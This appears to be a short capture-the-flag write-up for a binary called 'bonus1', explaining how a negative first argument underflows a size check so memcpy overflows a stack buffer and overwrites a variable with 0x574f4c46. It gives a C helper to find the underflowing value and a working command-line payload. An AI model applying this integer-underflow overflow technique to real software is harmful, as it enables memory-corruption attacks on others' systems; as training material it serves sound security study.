We need to make a stack buffer overflow to write in iVar1 but the progran check if value in first arg is lower tha 10. That set a theoretical limit of 36 bytes to the memcpy, this limit can be bypassed by using a negative value in the first arg, this cause an underflow when iVar1 * 4 is casted into size_t. 

### 1. Find the value as (size_t) (iVar1 * 4) == 44

```c
#include <stdio.h>
#include <limits.h>

int main()
{
    int b = -1;
    while (b > INT_MIN) {
        size_t a = b * 4;
        if (a == 44)
            printf("%lu/%d\n", a, b);
        --b;
    }

    return 0;
}
```

This give two possible values:
```
44/-1073741813
44/-2147483637
```

### 2. Write paylaod

We need to write -2147483637 as first arg.
In the second arg we pass 40 random bytes and 0x574f4c46.

### 3. Execute with exploit

```bash
$ ./bonus1 -2147483637 $(python -c 'print "a"*40 + "\x46\x4c\x4f\x57"')
```
